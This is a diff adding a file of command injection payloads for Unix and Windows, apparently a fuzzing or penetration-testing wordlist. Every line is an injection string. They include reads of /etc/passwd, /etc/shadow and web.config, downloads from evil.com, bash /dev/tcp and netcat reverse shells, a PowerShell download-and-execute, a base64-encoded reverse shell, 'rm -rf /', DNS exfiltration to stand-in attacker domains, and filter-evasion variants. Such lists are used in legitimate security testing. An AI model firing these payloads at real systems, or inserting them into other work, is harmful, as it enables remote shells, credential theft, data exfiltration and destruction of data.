@@ -1,0 +1,154 @@
+# Command Injection Payloads
+# Source: Compiled from various security research resources
+
+# Unix/Linux - Basic command separators
+; ls
+; id
+; whoami
+; pwd
+; cat /etc/passwd
+| ls
+| id
+| whoami
+&& ls
+&& id
+|| ls
+|| id
+`ls`
+`id`
+$(ls)
+$(id)
+
+# Unix - Advanced
+; ls -la
+; cat /etc/passwd
+; cat /etc/shadow
+; uname -a
+; ps aux
+; netstat -an
+; wget http://evil.com/shell.txt
+; curl http://evil.com/shell.txt
+| nc -nv 127.0.0.1 4444
+; bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'
+; rm -rf /
+; mkfifo /tmp/p; nc -l 4444 < /tmp/p | /bin/sh > /tmp/p 2>&1
+
+# Unix - Backtick command substitution
+`id`
+`whoami`
+`ls`
+`pwd`
+`cat /etc/passwd`
+$(id)
+$(whoami)
+$(ls)
+$(pwd)
+
+# Unix - Newline injection
+%0aid
+%0als
+%0awhoami
+%0acat /etc/passwd
+\nid
+\nls
+\nwhoami
+
+# Unix - Pipe command chaining
+| cat /etc/passwd
+| id
+| whoami
+| ls -la
+
+# Windows - Basic
+& dir
+& whoami
+& type C:\Windows\win.ini
+& ipconfig
+& net user
+| dir
+| whoami
+| type C:\Windows\win.ini
+&& dir
+&& whoami
+|| dir
+|| whoami
+
+# Windows - Advanced
+& type C:\inetpub\wwwroot\web.config
+& type C:\Windows\System32\drivers\etc\hosts
+& net view
+& netstat -an
+& tasklist
+& systeminfo
+
+# Windows - PowerShell
+; powershell -c "Get-Process"
+| powershell -c "Get-Process"
+& powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/evil.ps1')"
+
+# Blind command injection
+; sleep 5
+| sleep 5
+&& sleep 5
+; ping 127.0.0.1
+| ping 127.0.0.1
+
+# Time-based blind (Unix)
+; sleep 10
+| sleep 10
+&& sleep 10
+`sleep 10`
+$(sleep 10)
+; ping -c 10 127.0.0.1
+
+# Time-based blind (Windows)
+& timeout 10
+| timeout 10
+&& timeout 10
+& ping -n 10 127.0.0.1
+
+# Command injection via variable expansion
+{ls}
+{whoami}
+{id}
+${ls}
+${whoami}
+${id}
+
+# URL encoded
+%3Bls
+%7Cid
+%26%26whoami
+%60ls%60
+%24%28id%29
+%0Aid
+%0D%0Aid
+
+# Base64 encoded payloads
+echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx|base64 -d|bash
+;echo "YmFzaCAtaSA+"|base64 -d|bash
+
+# DNS exfiltration
+; nslookup `whoami`.evil.com
+; dig $(id).attacker.com
+; nslookup $(hostname).evil.com
+
+# Special cases
+;id;
+|id|
+&&id||
+||id&
+`id`
+$(id)
+;id\n
+|id\n
+%0aid
+
+# Substitution techniques
+;l${s} ;w${h}ami
+;l`s` ;w`h`ami
+;cat /et${c}/pas${swd}
+;ca''t /etc/passwd
+;c\at /etc/passwd
+;c''at /etc/passwd
+;ca\t /etc/passwd
